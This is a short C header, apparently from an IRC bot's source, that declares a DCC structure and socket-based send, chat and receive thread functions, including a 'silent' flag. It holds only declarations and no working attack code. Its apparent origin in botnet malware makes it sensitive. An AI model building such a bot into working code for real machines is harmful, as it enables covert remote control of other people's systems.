/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////

typedef struct DCC 
{
	SOCKET sock;
	SOCKET csock;
	char host[MAXHOSTNAME];
	char filename[MAX_PATH];
	char sendto[MAXCHANLEN];
	unsigned short port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} DCC;

SOCKET CreateSock(char *host, unsigned short port);
DWORD WINAPI DCCSendThread(LPVOID param);
DWORD WINAPI DCCChatThread(LPVOID param);
DWORD WINAPI DCCGetThread(LPVOID param);
